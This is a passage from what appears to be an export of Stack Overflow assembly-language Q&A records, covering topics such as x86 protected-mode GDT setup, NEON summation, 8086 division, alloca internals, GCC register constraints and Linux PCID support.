  <p>error: Cannot execute binary file exec format error</p>
</blockquote>

<p>Suggests your system can't understand the executable you are trying to run. In my comments I asked you to run <code>uname -a</code> so that I can find out what type of system you are running in your virtual machine. You gave the output as:</p>

<pre><code>Linux dell 3.16.0-50-generic #67~14.04.1-Ubuntu SMP Fri...i686 i686 i686 GNU/LINUX
</code></pre>

<p>The <code>i686</code> tells us this is a 32-bit version of Ubuntu, not 64-bit. Had the output included <code>x86_64</code> then you would be on a 64-bit Ubuntu.</p>

<p>A 32-Bit OS can't directly run 64-bit applications. If you need to generate and run 64-bit code you will need to install a 64-bit Ubuntu OS.</p>

<p>A 64-bit Ubuntu system can be configured to allow development of 32 and 64-bit code by using <em>multilib</em> support. If building software with C/C++ (or just the <em>C</em> libraries) it might be useful to install these packages on Ubuntu:</p>

<pre><code>sudo apt-get install gcc-multilib g++-multilib
</code></pre>

<hr>

<p>Assuming you do install a 64-bit OS, the command you use to link your executable appears incorrect. You have:</p>

<pre><code>nasm -f elf64 hello.asm -o hello.o    
ld -o hello.o hello -m elf_x86_64 
./hello
</code></pre>

<p>The <em>NASM</em> command looks okay. That assembles <code>hello.asm</code> to a 64-bit object file called <code>hello.o</code> . The <em>LD</em> command is being told to generate a 64-bit output file called <code>hello.o</code> from a file called <code>hello</code>. The commands should have looked like:</p>

<pre><code>nasm -f elf64 hello.asm -o hello.o    
ld -o hello hello.o -m elf_x86_64 
./hello
</code></pre>

<p>Notice that we now use <code>-o hello</code> as we want to output an executable called <code>hello</code> from an object file called <code>hello.o</code>.</p>
","34682185"
"Sum all elements in a quadword vector in ARM assembly with NEON","6862","","<p>Im rather new to assembly and although the arm information center is often helpful sometimes the instructions can be a little confusing to a newbie. Basically what I need to do is sum 4 float values in a quadword register and store the result in a single precision register. I think the instruction VPADD can do what I need but I'm not quite sure.</p>
","<p>It seems that you want to get the sum of a certain length of array, and not only four float values.</p>

<p>In that case, your code will work, but is far from optimized :</p>

<ol>
<li><p>many many pipeline interlocks</p></li>
<li><p>unnecessary 32bit addition per iteration</p></li>
</ol>

<p>Assuming the length of the array is a multiple of 8 and at least 16 :</p>

<pre><code>  vldmia {q0-q1}, [pSrc]!
  sub count, count, #8
loop:
  pld [pSrc, #32]
  vldmia {q3-q4}, [pSrc]!
  subs count, count, #8
  vadd.f32 q0, q0, q3
  vadd.f32 q1, q1, q4
  bgt loop

  vadd.f32 q0, q0, q1
  vpadd.f32 d0, d0, d1
  vadd.f32 s0, s0, s1
</code></pre>

<ul>
<li>pld - while being an ARM instruction and not NEON - is crucial for performance. It drastically increases cache hit rate.</li>
</ul>

<p>I hope the rest of the code above is self explanatory.</p>

<p>You will notice that this version is many times faster than your initial one.</p>
","7963108"
"What happens from the moment we press a key on the keyboard, until it appears in your word document","6839","","<p>This question was in my job interview.. I just to see whether I gave all the details...</p>
","<ul>
<li>mechanical switch short-circuits pull up R1 resistor end to the ground</li>
<li>a special multiplexor translates it into a message, to reduce the number of wires</li>
<li>the message interpreted by a CPU embedded in the keyboard</li>
<li>message translated to a USB protocol message, and modulated as a series of electric impulses of alternating voltage between zero and 5 volts </li>
<li>USB receiving hub measures samples line voltage periodically</li>
<li>host hub controller translates the message to data</li>
<li>data enters PC thru USB bus controller, connected to PCIE bus, thru a combination of IRQ notificaitons and a DMA transfer, issued by the bus driver</li>
<li>Bus driver interprets the message and forwards it along the driver stack, ultimately to an HID driver</li>
<li>HID driver talks to windows, ultimately resulting in a window message sent to a window belonging to msword process</li>
<li>WM_KEYDOWN is translated to WM_CHAR by DefWindowProc(). While key is down, multiple WM_CHARs may be created.</li>
<li>Word application catches WM_CHAR to add another character to the document model and issue re-rendering of UI</li>
<li>UI rendering engine translates unicode codepoint to graphical image by loading respective font</li>
<li>graphics engine computes the new image of the whole area to avoid flicker, and puts it pixel-by-pixel to the screen</li>
</ul>
","3083436"
"Assembler jump in Protected Mode with GDT","6838","","<p>I am currently playing around with x86 Assember in order to sharpen my low-level programming skills. Currently, I am facing a little problem with the addressing scheme in 32-Bit Protected Mode.</p>

<p>The situation is the following:</p>

<p>I have a Program loaded at 0x7e0 which switches the CPU to Protected Mode and jumps to the according label in the code:</p>

<pre><code>[...]
code to switch CPU in Protected Mode
[...]

jmp ProtectedMode


[...]

bits 32

ProtectedMode:
    .halt:
        hlt
        jmp .halt
</code></pre>

<p>This works absolutely fine so far. The ""jmp ProtectedMode"" works without a explicit far jump to clear the prefetch queue - since this program is loaded with offset 0 (org 0 at the beginning) - causing the code segment pointing to the right location.</p>

<p>My current problem now is, that within the ""ProtectedMode"" label I want to jump to an other program which is loaded at 0x8000 (I checked this with a memory dump, the loading function did work properly and the program is loaded correctly to 0x8000).</p>

<p>Since the CPU is now in ProtectedMode and not RealMode anymore, the addressing schema is different. ProtectedMode uses descriptor selectors to lookup a base address and a limit in a descriptor table to add the given offset and retrieve the physical address (as I understood). Therefore, it was necessary to install a GDT before entering ProtectedMode.</p>

<p>Mine is looking like the following:</p>

<pre><code>%ifndef __GDT_INC_INCLUDED__
%define __GDT_INC_INCLUDED__

;*********************************
;* Global Descriptor Table (GDT) *
;*********************************
NULL_DESC:
    dd 0            ; null descriptor
    dd 0

CODE_DESC:
    dw 0xFFFF       ; limit low
    dw 0            ; base low
    db 0            ; base middle
    db 10011010b    ; access
    db 11001111b    ; granularity
    db 0            ; base high

DATA_DESC:
    dw 0xFFFF       ; data descriptor
    dw 0            ; limit low
    db 0            ; base low
    db 10010010b    ; access
    db 11001111b    ; granularity
    db 0            ; base high

gdtr:
    Limit dw 24         ; length of GDT
    Base dd NULL_DESC   ; base of GDT

%endif ;__GDT_INC_INCLUDED__
</code></pre>

<p>and is loaded to the GDT register via</p>

<pre><code>lgdt [gdtr]
</code></pre>

<p>What I did not understand so far is, how do I now jump to the physical address 0x8000 in ProtectedMode using the GDT?</p>

<p>My first thoughts were to select the Code Descriptor (CODE_DESC) which should point to 0x7e00 (were the current program is loaded) and use the offset that is necessary to get to 0x8000 (512 bytes), resulting in the jump instruction:</p>

<pre><code>jmp CODE_DESC:0x200
</code></pre>

<p>But this does not work. </p>

<pre><code>jmp 0x7e0:0x200 
</code></pre>

<p>does not work either...</p>

<p>Do you have any idea what I am missing here? Maybe I did not understand something essential within the 32-Bit ProtectedMode addressing scheme and the usage of the GDT.</p>

<p><strong>[EDIT] Complete code:</strong></p>

<pre><code>bits 16
org 0                       ; loaded with offset 0000 (phys addr: 0x7e00)

jmp Start

Start:
    xor ax, ax
    mov ax, cs
    mov ds, ax              ; update data segment

    cli                     ; clear interrupts

    lgdt [gdtr]             ; load GDT from GDTR (see gdt_32.inc)

    call OpenA20Gate        ; open the A20 gate 

    call EnablePMode        ; jumps to ProtectedMode

;******************
;* Opens A20 Gate *
;******************
OpenA20Gate:
    in al, 0x93         ; switch A20 gate via fast A20 port 92

    or al, 2            ; set A20 Gate bit 1
    and al, ~1          ; clear INIT_NOW bit
    out 0x92, al

    ret

;**************************
;* Enables Protected Mode *
;**************************
EnablePMode:
    mov eax, cr0
    or eax, 1
    mov cr0, eax

    jmp ProtectedMode ; this works (jumps to label and halts)
    ;jmp (CODE_DESC-NULL_DESC):ProtectedMode ; =&gt; does not work
    ;jmp 08h:ProtectedMode , =&gt; does not work

;***************
;* data fields *
;*  &amp;includes  *
;***************
%include ""gdt_32.inc""

;******************
;* Protected Mode *
;******************
bits 32

ProtectedMode:
    ;here I want to jump to physical addr 0x8000 (elf64 asm program)

    .halt:
        hlt
        jmp .halt
</code></pre>
","<p>There are multiple problems in the code.</p>

<p>First, your <code>GDTR.Base</code> contains the offset of the <code>GDT</code> from the beginning of the code since your code is compiled to begin at address 0 (because of <code>org 0</code>). The base address must be the physical address, not a relative address. IOW, if you keep this <code>org 0</code>, you must add <code>CS</code>*16 (=0x7e00) to <code>Base</code>.</p>

<p>Second, because of that same <code>org 0</code>, the 32-bit offsets in your code (after <code>bits 32</code> and <code>ProtectedMode:</code>) aren't equal to physical addresses they correspond to, they're 0x7e00 less than the physical addresses. OTOH, the segments defined in your GDT start at physical address 0 (because the base portions of the GDT entries are 0's) and not at 0x7e00. This means that when you try to use these segments with your code/data, you'll be missing the addresses by 0x7e00. If you want to keep <code>org 0</code>, the base addresses in the GDT must be set to 0x7e00.</p>

<p>Or you can change <code>org 0</code> to <code>org 0x7e00</code> and then the bases in the GDT should be 0. And you won't need to adjust GDTR.Base by 0x7e00, 0 will do.</p>

<p>This should work:</p>

<pre><code>bits 16
org 0x7e00                  ; loaded at phys addr 0x7e00
                            ; control must be transferred with jmp 0:0x7e00

    xor ax, ax
    mov ds, ax              ; update data segment

    cli                     ; clear interrupts

    lgdt [gdtr]             ; load GDT from GDTR (see gdt_32.inc)

    call OpenA20Gate        ; open the A20 gate 

    call EnablePMode        ; jumps to ProtectedMode

;******************
;* Opens A20 Gate *
;******************
OpenA20Gate:
    in al, 0x93         ; switch A20 gate via fast A20 port 92

    or al, 2            ; set A20 Gate bit 1
    and al, ~1          ; clear INIT_NOW bit
    out 0x92, al

    ret

;**************************
;* Enables Protected Mode *
;**************************
EnablePMode:
    mov eax, cr0
    or eax, 1
    mov cr0, eax

    jmp (CODE_DESC - NULL_DESC) : ProtectedMode

;***************
;* data fields *
;*  &amp;includes  *
;***************
;%include ""gdt_32.inc""
;*********************************
;* Global Descriptor Table (GDT) *
;*********************************
NULL_DESC:
    dd 0            ; null descriptor
    dd 0

CODE_DESC:
    dw 0xFFFF       ; limit low
    dw 0            ; base low
    db 0            ; base middle
    db 10011010b    ; access
    db 11001111b    ; granularity
    db 0            ; base high

DATA_DESC:
    dw 0xFFFF       ; limit low
    dw 0            ; base low
    db 0            ; base middle
    db 10010010b    ; access
    db 11001111b    ; granularity
    db 0            ; base high

gdtr:
    Limit dw gdtr - NULL_DESC - 1 ; length of GDT
    Base dd NULL_DESC   ; base of GDT

;******************
;* Protected Mode *
;******************
bits 32

ProtectedMode:
    mov     ax, DATA_DESC - NULL_DESC
    mov     ds, ax ; update data segment

    .halt:
        hlt
        jmp .halt
</code></pre>

<p>Note that a segment limit equals the segment size minus 1.</p>

<p>A few more points... Load all segment registers with valid selectors or 0. Also, set up the stack. If you have garbage there (or old values from real mode), when you start playing with interrupts/exceptions, you'll have more crashes.</p>

<p>Finally, I don't know what elf64 is, but you will have to take care of the <code>org</code> thing for other modules and make sure all generated addresses correspond to load addresses. And if you intend to enable 64-bit mode, there's a ton of work to do. I'd advise not to rush into 64-bit mode yet since you're tripping over relatively simple stuff.</p>
","9140193"
"Assembly memory allocation","6828","","<p>I am trying to learn assembly language and I need clarification on something.  Please correct me if I am wrong on any of this since I don't know much about assembly.</p>

<p>All the tutorials I watch have the variables of assembly programs assigned to a memory address like <code>0x0000</code>, and I can understand that you must manually assign memory addresses in assembly, but how do you know what address to use?</p>

<p>Obviously it makes sense to start at the lowest memory address possible, but what if the variable you are assigning is larger than the memory available at <code>0x0000</code>?  Would the variable in question run over to <code>0x0001</code> or <code>0x0002</code>?  If it did wouldn't that mess up other variables assigned spaces with similar numbering (or are you not supposed to assign them that close)?</p>

<p>If I have two programs written in assembly running at the same time (in a modern OS) and I have used the same memory addresses in both programs, will one program conflict with the other, or does the OS just assign an available memory address regardless of what was actually written in the program?</p>

<p>Any information on the subject is appreciated.</p>
","<p>The answer to the second part of you question (on most modern OSs) is virtual memory.</p>

<p>You start at the hardware layer with physical memory.  That's the stuff you can actually poke with your finger.  This is what the operating system sees.  The operating system lets you run processes on an abstraction called virtual memory.</p>

<p>Each process gets its own virtual memory space.  So it can pretend that it's the only process running, and it has tons of memory.  Then each time you access memory, you supply a virtual address, which gets mapped to a physical address.  The operating system keeps a table of which virtual address gets mapped to which actual physical addresses in RAM.  Typically this is done with some special hardware as well (an MMU, memory management unit) for performance reasons, but you could do it 100% in software too.</p>

<p>So when you say 0x000 in your program, that's a virtual address.  It gets translated into a physical address by the computer when you read or write.  So in another process, the same virtual address 0x000 maps to a different physical address.  This system lets you write your program without knowing exactly how much RAM is available, or what address your program will be loaded into.  It also prevents your program from trashing memory that belongs to another program.</p>

<p>As for the first part, absolutely.  Different types of data take different amounts of memory.  You have to know how much space you need when you lay out your data structures.  There are also byte-alignment issues to keep in mind.  Multi-byte data types (eg floating point numbers) often have to start at an address that is divisible by 2 or 4 or the number of bytes it takes to store a float -- it's a requirement of the processor or the RAM.  So you can't just crunch all your data together, one byte after the next, you have to lay it out in a specific order like fitting together the pieces of a puzzle if you want to minimize unused memory.</p>
","3498474"
"Division in 8086 Assembly in MASM","6819","","<p>I am writing this assembly program in 8086, but it is not working properly. The quotient and remainder prints out as some random symbols even though I use single digit numbers. Can someone please point out the errors/mistakes in the program? Thank you.</p>

<pre><code>.model small
.stack 50h

.data
Divisor db ?
Dividend db ?
Quotient db ?
Remainder db ?

.code
main_method   proc
              mov    ax, @data
              mov    ds, ax

              mov    ah, 01
              int    21h
              sub    al, 48
              mov    Divisor, al

              mov    ah, 01
              int    21h
              sub    al, 48
              mov    Dividend, al
              mov    bl, 00
              mov    al, 00
              mov    bl, Divisor
              mov    al, Dividend
              div    bl

              mov    Quotient, al
              mov    Remainder, ah

              mov    dl, Quotient
              add    dl, 48
              mov    ah, 02
              int    21h

              mov    dl, Remainder
              add    dl, 48
              mov    ah, 02
              int    21h
              mov    ah, 4ch
              int    21h
main_method   endp
              end    main_method
</code></pre>
","<p><code>DIV BL</code> divides the 16-bit value in <code>AX</code> by <code>BL</code>, so you should clear those bits of <code>AX</code> that you're not using (in this case the entire upper byte). So right before the <code>DIV</code>, add either:</p>

<pre><code>MOV AH,0
</code></pre>

<p>or</p>

<pre><code>XOR AH,AH  ; XORing something with itself clears all bits
</code></pre>

<p><br>
Or, if you're targetting 80386 or above you can replace <code>Mov Al, Dividend</code> with <code>MOVZX AX, BYTE PTR Dividend</code></p>
","21656781"
"Alloca implementation","6818","","<p>How does one implement alloca() using inline x86 assembler in languages like D, C, and C++?  I want to create a slightly modified version of it, but first I need to know how the standard version is implemented.  Reading the disassembly from compilers doesn't help because they perform so many optimizations, and I just want the canonical form.</p>

<p>Edit:  I guess the hard part is that I want this to have normal function call syntax, i.e. using a naked function or something, make it look like the normal alloca().</p>

<p>Edit # 2:  Ah, what the heck, you can assume that we're not omitting the frame pointer.</p>
","<p>implementing <code>alloca</code> actually <strong>requires compiler assistance</strong>. A few people here are saying it's as easy as:</p>

<pre><code>sub esp, &lt;size&gt;
</code></pre>

<p>which is unfortunately only half of the picture. Yes that would ""allocate space on the stack"" but there are a couple of gotchas.</p>

<ol>
<li><p>if the compiler had emitted code
which references other variables
relative to <code>esp</code> instead of <code>ebp</code>
(typical if you compile with no
frame pointer). Then those
references need to be adjusted. Even with frame pointers, compilers do this sometimes.</p></li>
<li><p>more importantly, by definition, space allocated with <code>alloca</code> must be
""freed"" when the function exits.</p></li>
</ol>

<p>The big one is point #2. Because you <strong>need</strong> the compiler to emit code to symmetrically add <code>&lt;size&gt;</code> to <code>esp</code> at every exit point of the function.</p>

<p>The most likely case is the compiler offers some intrinsics which allow library writers to ask the compiler for the help needed.</p>

<p><strong>EDIT:</strong></p>

<p>In fact, in glibc (GNU's implementation of libc). The implementation of <code>alloca</code> is simply this:</p>

<pre><code>#ifdef  __GNUC__
# define __alloca(size) __builtin_alloca (size)
#endif /* GCC.  */
</code></pre>

<p><strong>EDIT:</strong></p>

<p>after thinking about it, the minimum I believe would be required would be for the compiler to <strong>always</strong> use a frame pointer in any functions which uses <code>alloca</code>, regardless of optimization settings. This would allow all locals to be referenced through <code>ebp</code> safely and the frame cleanup would be handled by restoring the frame pointer to <code>esp</code>.</p>

<p><strong>EDIT:</strong></p>

<p>So i did some experimenting with things like this:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

#define __alloca(p, N) \
    do { \
        __asm__ __volatile__( \
        ""sub %1, %%esp \n"" \
        ""mov %%esp, %0  \n"" \
         : ""=m""(p) \
         : ""i""(N) \
         : ""esp""); \
    } while(0)

int func() {
    char *p;
    __alloca(p, 100);
    memset(p, 0, 100);
    strcpy(p, ""hello world\n"");
    printf(""%s\n"", p);
}

int main() {
    func();
}
</code></pre>

<p>which unfortunately <strong>does not work</strong> correctly. After analyzing the assembly output by gcc. It appears that optimizations get in the way. The problem seems to be that since the compiler's optimizer is entirely unaware of my inline assembly, it has a habit of doing the things in an unexpected order and <strong>still</strong> referencing things via <code>esp</code>.</p>

<p>Here's the resultant ASM:</p>

<pre><code>8048454: push   ebp
8048455: mov    ebp,esp
8048457: sub    esp,0x28
804845a: sub    esp,0x64                      ; &lt;- this and the line below are our ""alloc""
804845d: mov    DWORD PTR [ebp-0x4],esp
8048460: mov    eax,DWORD PTR [ebp-0x4]
8048463: mov    DWORD PTR [esp+0x8],0x64      ; &lt;- whoops! compiler still referencing via esp
804846b: mov    DWORD PTR [esp+0x4],0x0       ; &lt;- whoops! compiler still referencing via esp
8048473: mov    DWORD PTR [esp],eax           ; &lt;- whoops! compiler still referencing via esp           
8048476: call   8048338 &lt;memset@plt&gt;
804847b: mov    eax,DWORD PTR [ebp-0x4]
804847e: mov    DWORD PTR [esp+0x8],0xd       ; &lt;- whoops! compiler still referencing via esp
8048486: mov    DWORD PTR [esp+0x4],0x80485a8 ; &lt;- whoops! compiler still referencing via esp
804848e: mov    DWORD PTR [esp],eax           ; &lt;- whoops! compiler still referencing via esp
8048491: call   8048358 &lt;memcpy@plt&gt;
8048496: mov    eax,DWORD PTR [ebp-0x4]
8048499: mov    DWORD PTR [esp],eax           ; &lt;- whoops! compiler still referencing via esp
804849c: call   8048368 &lt;puts@plt&gt;
80484a1: leave
80484a2: ret
</code></pre>

<p>As you can see, it isn't so simple. Unfortunately, I stand by my original assertion that you need compiler assistance.</p>
","714833"
"When should carry flag be set in assembly language","6816","","<p>I'm puzzled by this problem when writting an ARM assembly simulator in C. I've found some similar questions in the forum, but none of them explain how to set the carry flag just using the relationship between two operands and the result.</p>

<p>Any reply is appreciated. Thanks in advance.</p>

<p>Regard.</p>
","<p>You have to check the reference manual for the processor to know which instructions set the carry flags and in which way.  I don't know enough about ARM, but I've seen some variations in other processors:</p>

<ul>
<li><p>some instructions which logically generates a carry may not set the carry flag</p></li>
<li><p>some instructions may use the carry flag with as some additional implicit operand or result without having a connection with addition/subtraction</p></li>
<li><p>after a subtraction, processors vary in which condition the carry flag is set (i.e some do it in the same way as after the addition of an inversed second operand, the other set it to the negation of that)</p></li>
</ul>

<p>If what you want is a way to see if a carry should be generated for an addition in C, here are two ways (the first is straight from definition, the second comes from wrap around behavior of unsigned):</p>

<pre><code>unsigned w1, w2, result;
int carry;

carry = w1 &gt; UINT_MAX-w2;

result = w1 + w2;
carry = result &lt; w1;
</code></pre>
","2855420"
"GCC inline assembly: register constraints on intel x86_64","6807","","<p>Here's the list of register loading codes:</p>

<blockquote>
  <p>a        eax<br>
  b        ebx<br>
  c        ecx<br>
  d        edx<br>
  S        esi<br>
  D        edi<br>
  I        constant value (0 to 31)<br>
  q,r      dynamically allocated register (see below)<br>
  g        eax, ebx, ecx, edx or variable in memory<br>
  A        eax and edx combined into a 64-bit integer (use long longs)  </p>
</blockquote>

<p>But this is register constraints for intel i386. My question is where I can find the register constraints of intel x86_64 system, like:</p>

<blockquote>
  <p>?  %r10<br>
  ?  %r8<br>
  ?  %rdx  </p>
</blockquote>

<p>and so on.</p>
","<p>The machine specific constraints have a section in the <a href=""https://gcc.gnu.org/onlinedocs/gcc-6.3.0/gcc/Machine-Constraints.html#Machine-Constraints"" rel=""nofollow noreferrer"">gcc manual</a> - the ugly details are found in <a href=""http://gcc.gnu.org/viewcvs/gcc/trunk/gcc/config/i386/constraints.md?view=co&amp;revision=198401&amp;content-type=text/plain"" rel=""nofollow noreferrer"">config/i386/constraints.md</a>.</p>

<p>Some constraints have different meanings for x86-64, e.g., <code>q</code> is <code>%eax</code>,<code>%ebx</code>,<code>%ecx</code>,<code>%edx</code> in 32-bit mode; in 64-bit mode, it's any general purpose integer register - and essentially the same as the <code>r</code> constraint. Specific registers names like <code>a</code> now refer to <code>%rax</code>, <code>d</code> to <code>%rdx</code>, etc.</p>

<p>There are, however, no special constraints or names for <code>%r8</code> .. <code>%r15</code>. There's an excellent (x86-64 specific) tutorial on inline assembly and constraint use <a href=""http://locklessinc.com/articles/gcc_asm/"" rel=""nofollow noreferrer"">here</a>.</p>
","17163421"
"operation size not specified","6807","","<p>I have a problem with 32bit Assembly, assembling it with NASM on linux.
Here is my implementation of insertion sort</p>

<pre><code>myInsertionSort:
push ebp
mov ebp, esp
push ebx
push esi
push edi
mov ecx, [ebp+12]   ;put len in ecx, our loop variable
mov eax, 1 ; size of one spot in array, one byte
mov ebx, 0
mov esi, [ebp+8] ; the array
loop loop_1
loop_1:
    cmp eax, ecx ; if we're done
    jge done_1 ; then done with loop
    push ecx ; we save len, because loop command decrements ecx
    mov ecx, [esi+eax] ; ecx now array[i]
    mov ebx, eax
    dec ebx ; ebx is now eax-1, number of times we should go through inner loop
    loop_2:
        cmp ebx, 0 ; we don't use loop to not affect ecx so we use ebx and compare it manually with 0
        jl done_2
        cmp [esi+ebx], ecx ;we see if array[ebx] os ecx so we can exit the loop
        jle done_2
        mov edx, esi
        add edx, ebx
        push [edx] ; pushing our array[ebx] *****************************
        add edx, eax
        pop [edx] ; poping the last one *********************************
        dec ebx ; decrementing the loop iterator
        jmp loop_2 ; looping again
    done_2:
        mov [esi+ebx+1], ecx
        inc eax ; incrementing iterator
        pop ecx ; len of array to compare now to eax and see if we're done
        jmp loop_1
done_1:
    pop edi
    pop esi
    pop ebx
    pop ebp ; we pop them in opposite to how we pushed (opposite order, it's the stack, LIFO)
    ret
</code></pre>

<p>Now... When I try to compile my code with nasm, I get errors of ""operation size not specified"" on the lines containing asterisks in the comments :P
It's basic insertion sort and I'm not sure what could have gone wrong.
Enlighten me, please. </p>
","<p>The data at <code>[edx]</code> could be anything, so its size is unknown to the assembler. You'll have to specify the size of the data you want to push/pop. For example, if you want to push/pop a <code>dword</code> (32 bits) you'd write:</p>

<pre><code>push dword [edx]
pop dword [edx]
</code></pre>

<hr>

<p>By the way, you can combine these lines:</p>

<pre><code>mov edx, esi
add edx, ebx
</code></pre>

<p>into:</p>

<pre><code>lea edx,[esi + ebx]
</code></pre>
","27679056"
"Does Linux use x86 CPU's PCID feature for TLB? If not, why?","6801","","<p>I wrote a kernel module to check CR4.PCIDE, it is not set. Why doesn't Linux use such feature to reduce the performance slowdown due to TLB invalidation and cache pollution?</p>
","<blockquote>
  <p><strong>Update:</strong> This changed around the 4.15 timeframe due to the <a href=""https://meltdownattack.com/"" rel=""nofollow noreferrer"">Meltdown and Spectre attacks</a> in late 2017 and early 2018. See <a href=""https://stackoverflow.com/a/41404782/2245623"">the other answer</a> for details.</p>
</blockquote>

<p>Note: I'm not a Linux developer</p>

<p>For Intel's ""Process Context Identifiers"", there's a limit of 4096 IDs. This means that when there are more than 4096 processes you need to manage them (e.g. maybe do a ""least recently used"" thing so that if a process that currently doesn't have an ID needs to be executed then the ID is taken from some other process and reused).</p>

<p>The other thing that comes into it is ""TLB shootdown"" on multi-CPU systems. These can be a little expensive, so people do tricks to avoid them. For example, if a process only has one thread then it can only be running on one CPU and you know there's no need to send an IPI to other CPUs (interrupting them and asking them to do the ""TLB shootdown""). Once you start using PCIDs you can't be sure that other CPUs don't still have TLB entries, and can't do these tricks to avoid ""TLB shootdown"". It also means that (in theory, for badly implemented PCID support) the performance you gain from PCID may be less than the performance you lose due to unavoided TLB shootdown and ID management overhead, resulting in a net loss.</p>

<p>Mostly what I'm saying is that it's a little complicated to add support for PCID (it's not like you can just set a flag in CR4 and forget about it). You'd have to do some research (experiments, prototypes, benchmarking) to determine the most effective way of implementing it. For a large/complex/old kernel (like Linux) it'd be even more complicated as you'd have to be careful not to upset something else by accident. The other thing is that this feature is relatively new (it's only existed for a few years if I remember correctly) and isn't supported by a lot of CPUs (e.g. anything a little older, and anything from AMD).</p>

<p>Basically, I'd assume that it comes down to ""time vs. benefits"" (or, not enough time for a small performance improvement on a limited number of CPUs).</p>
","20158912"
"Multidimensional Arrays in Assembly Language","6795","","<p>Hi All 
Can Any one plz tell me how to handle 2d arrays in 8086 assembly language.
i am beginer in assembly language programming.
Thanks</p>
","<p>Madhur's link pretty much covers it, did you read through that?</p>

<p>if you already understand a 2d array at the C programming level for example then the assembler is the next logical step.</p>

<p>Using 8 bit bytes for example an array z[1][2] is second row third item over if you want to think of it that way, to compute the address it is as it is in C   address of z plus the first index times width of the array, lets say it is 13 bytes wide, plus the second index so &amp;z + (13*1)+2 = &amp;z+15;</p>

<p>Using pseudo code and not x86 code (in case this is homework).</p>

<pre>
;brute force
ldr r0,=z ;load address of z into r0
mov r1,#13
mul r1,#1 ;make this a register or load from a memory location
mov r2,#2 ;make this a register or load from a memory location
add r0,r1
add r0,r2
ldrb r1,[r0] ;read the byte
strb r3,[r0] ;write the byte

;if your instruction set allows register offset
ldr r0,=z ;load address of z into r0
mov r1,#13
mul r1,#1
mov r2,#2
add r1,r2
ldrb r4,[r0,r1] ;read the byte
strb r3,[r0,r1] ;write the byte

;or immediate offset and offset is hardcoded
ldr r0,=z ;load address of z into r0
mov r1,#13
mul r1,#1
add r0,r1
ldrb r4,[r1,#2] ;read the byte
strb r3,[r1,#2] ;write the byte
</pre>

<p>if you had loops in C</p>

<pre>
unsigned char x[4][16];
unsigned char z[4][16];
unsigned int ra,rb;

for(ra=0;ra&lt;4;ra++)
{
  for(rb=0;rb&lt;16;rb++)
  { 
      x[ra][rb]=z[ra][rb];
  }
}
</pre>

<p>The conversion to assembler is pretty straight forward.</p>

<pre>

ldr r0,=x
ldr r1,=z
mov r2,#0 ;ra
outer:
  mov r3,#0 ;rb
  inner:
    mov r4,r2 lsl #2 ;16 bytes wide
    add r4,r3
    ldrb r5,[r1,r4]
    strb r5,[r0,r4]
    add r3,r3,#1
    cmp r3,#16
    bne inner
  add r2,r2,#1
  cmp r2,#4
  bne outer
</pre>

<p>Brute force will always work for each platform, brute force being base address + (width times first index) + (second index times size of element).   Optimizations rely heavily on what you are trying to do, in the first assembly examples I did for example it is silly to multiply by one if the first index is a hardcoded one, and/or silly to move #2 to a register if that is a hardcoded number, just add 2.  If computing one time vs a loop changes the optimal number of registers to use, etc.  if your platform does not have a multiply or it is painful then making your arrays powers of two if possible is a good idea, get rid of the multiply, or other tricks to get rid if the multiply if you cannot change the width and your platform does not have or makes multiplies painful.</p>

<p>Platforms that have some sort of register offset addressing [r0,r1] where the address is the sum of the two registers for example, saves you an add and prevents destroying the base address register so that you can use it again in a loop.  If you want to go pointer style with a destroy as you go pointer (*ptr++), that could change how you implement your loops, some platforms allow you to use a base register and add a value to it, for example [r0],#16 would use the address at r0 then after using r0 add 16 to r0 so you dont have to burn an extra add instruction...I dont think x86 has that but it has other features that you can use for this task.</p>

<p>Start with brute force, being x86 that means you are likely going to have to use memory to keep loop variables as you probably do not have enough registers for the task (that is okay because x86 has lots of memory based instructions), then optimize taking advantage of load and store variations.</p>
","4541311"
"x86 assembly ""push OFFSET ..."" and mnemonics?","6795","","<p>I'm trying to teach myself a bit of assembly by creating small C programs in <strong>Visual Studio 2012 Express</strong>, and then disassembling them in <strong>Immunity Debugger</strong>. But I've obviously run into something I do not understand:</p>

<pre><code>012A13F0   68 58582A01      PUSH OFFSET Hello_Wo.??_C@_0M@KPLPPDAC@H&gt;; ASCII ""Hello World""
012A13F5   FF15 BC922A01    CALL DWORD PTR DS:[&lt;&amp;MSVCR110D.printf&gt;]  ; MSVCR110.printf
</code></pre>

<p>I'm confused by both of these instructions. In fact, the opcodes make more sense to me than the actual instructions depicted by the debugger.</p>

<p>Obviously, the first instruction pushes an address onto the stack. When I follow the address in the dump, it shows me an area which contains some hexadecimals that comprise the string <code>Hello World</code>. I believe this is the <code>.data segment</code>. Am I correct?</p>

<p>And also; I guess <code>Hello_Wo.??_C@_0M@...</code>  is just a visual aid provided to me by the debugger, so I could better understand that this is... Something...</p>

<p>But what does the <strong>OFFSET</strong> mean in this push instruction? I haven't been able to find anything on Google on it.</p>

<p>I would also like to ask about the other instruction...</p>

<p>As far as I understand, it is trying to call a routine by using the 4-byte value located at the address <code>DS:[102A92BC] (&amp;MSVCR110D...)</code>, <em>as the address of the call</em>?</p>

<p>The debugger tells me that <code>DS:[102A92BC] = 5C0A93A0</code>. And that memory range is reserved for MSVCR110's <code>.text segment</code>.</p>

<p>I'm very sorry, but I had a hard time making this question, as I wasn't even really sure how I should ask it. I hope you understand. And thank you.</p>

<p><strong>Off-topic:</strong> I have one last question that is a bit stupid, and off-topic, but I hope you don't mind: You aren't suppose to read data segments as disassembled code, ever, are you? the imports data segment made me confused in my search for <code>5C0A93A0</code>.</p>
","<p>In x86 architecture, every address has two parts - segment and offset. So, OFFSET means simply that the offset of the address of some variable ""Hello_Wo.??_C@_0M@KPLPPDAC@H"" is pushed in the stack. This directive is from the MASM syntax where ""push variable"" means push the value of the variable and ""push offset variable"" means push the offset of the variable. </p>

<p>Mentioned "".data"" and "".text"" are not segments, but sections. It's completely different. The section is just a part of the executable file that has separate memory protection. The C/C++ compilers usually use "".text"" for the program code. Don't ask me why.</p>

<p>In the modern protected mode OSes, flat memory model is used. That means all code and data is placed in one big segment, so you never has to work with DS, ES, etc. segment registers. Their values are managed by the OS.</p>

<p>P.S. Beginning to learn assembly language with reversing HLL programs is not the best strategy. </p>

<p>Better try to read and write some native assembly code. There are many places in Internet where you can download such examples - very simple and very complex, depending on your progress. I would suggest using <a href=""http://flatassembler.net"">FASM</a>. There is a message board, with tons of useful information and people that can answer your questions.</p>
","17634965"
